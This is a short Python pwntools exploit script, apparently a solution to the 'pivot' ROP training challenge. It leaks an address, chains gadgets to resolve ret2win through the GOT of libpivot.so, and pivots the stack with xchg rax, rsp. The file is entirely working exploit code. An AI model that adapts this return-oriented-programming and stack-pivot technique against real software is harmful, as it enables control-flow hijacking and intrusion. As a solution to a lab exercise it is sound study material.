from pwn import *

io = process('./pivot')
elf = ELF('./pivot')
lib = ELF('./libpivot.so')

leave_ret = 0x0000000000400adf		# leave ; retn
pop_rax = 0x0000000000400b00			# pop rax ; retn
pop_rbp = 0x0000000000400900			# pop rbp ; retn
mov_rax_rax = 0x0000000000400b05		# mov rax, [rax] ; retn
xchg_rax_rsp = 0x0000000000400b02		# xchg rax, rsp ; retn
add_rax_rbp = 0x0000000000400b09		# add rax, rbp ; retn
call_rax = 0x000000000040098e			# call rax ;

foothold_plt = elf.plt['foothold_function']		# 0x400850
foothold_got = elf.got['foothold_function']		# 0x602048
offset = int(lib.sym['ret2win'] - lib.sym['foothold_function'])	# 0x14e
leakaddr = int(io.recv().split()[20], 16)

def step_1():
	payload_1  = p64(foothold_plt)
	payload_1 += p64(pop_rax)
	payload_1 += p64(foothold_got)
	payload_1 += p64(mov_rax_rax)
	payload_1 += p64(pop_rbp)
	payload_1 += p64(offset)
	payload_1 += p64(add_rax_rbp)
	payload_1 += p64(call_rax)

	io.sendline(payload_1)

def step_2():
	payload_2  = "A" * 40
	payload_2 += p64(pop_rax)
	payload_2 += p64(leakaddr)		# rax
	payload_2 += p64(xchg_rax_rsp)	# rsp

	io.sendline(payload_2)
	io.recvuntil("ROPE")
	print io.recvall()

if __name__=='__main__':
	step_1()
	step_2()
